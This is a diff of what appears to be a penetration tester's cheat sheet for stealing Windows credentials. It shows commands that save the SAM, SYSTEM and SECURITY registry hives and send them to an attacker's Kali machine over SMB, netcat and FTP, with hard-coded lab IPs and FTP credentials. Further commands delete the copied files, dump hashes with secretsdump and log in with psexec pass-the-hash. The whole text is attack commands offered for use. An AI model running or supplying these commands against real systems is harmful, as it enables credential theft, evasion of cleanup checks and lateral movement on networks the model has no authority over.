@@ -1,14 +1,50 @@
+================================== 
+Check
+dir C:\Windows\Repair\SAM
+dir C:\Windows\Repair\SYSTEM
+dir C:\Windows\System32\config\RegBack\SAM 
+dir C:\Windows\System32\config\RegBack\SYSTEM 
+
+================================== 
 reg save hklm\sam C:\Windows\Temp\samx
 reg save hklm\system C:\Windows\Temp\systemx
 reg save hklm\security C:\Windows\Temp\securityx
 
+================================== 
 cd C:\Windows\temp\
-cd C:\Users\Administrator\Downloads
+cd C:\Users\Administrator\Downloads\
 reg.exe save hklm\sam samx
 reg.exe save hklm\security securityx
 reg.exe save hklm\system systemx
 
-copy *x \\192.168.162.46\share\
+================================== 
+Upload to Kali
+python3 /usr/share/doc/python3-impacket/examples/smbserver.py share `pwd` -smb2support
+copy *x \\192.168.119.154\share\
+copy C:\Windows\Repair\SAM \\192.168.119.15\share\
+copy C:\Windows\Repair\SYSTEM \\192.168.119.15\share\
+
+nc -nvlp 4444 > samx   
+nc -nvlp 4444 > systemx   
+nc -nvlp 4444 > securityx  
+nc.exe -nv 192.168.119.154 4444 < samx   
+nc.exe -nv 192.168.119.154 4444 < systemx  
+nc.exe -nv 192.168.119.154 4444 < securityx
+
+Kali> sudo python3 -m pyftpdlib -p 21 -u mike -P helps -w  
+ftp 192.168.119.154  
+mike  
+helps  
+PUT samx  
+PUT systemx  
+PUT securityx  
+bye  
+
+
+================================== 
+Cleanup
 del samx systemx securityx
 
+================================== 
 secretsdump -sam samx -system systemx LOCAL
+psexec administrator@192.168.200.5 -hashes aad3bxyz:efds123xyz
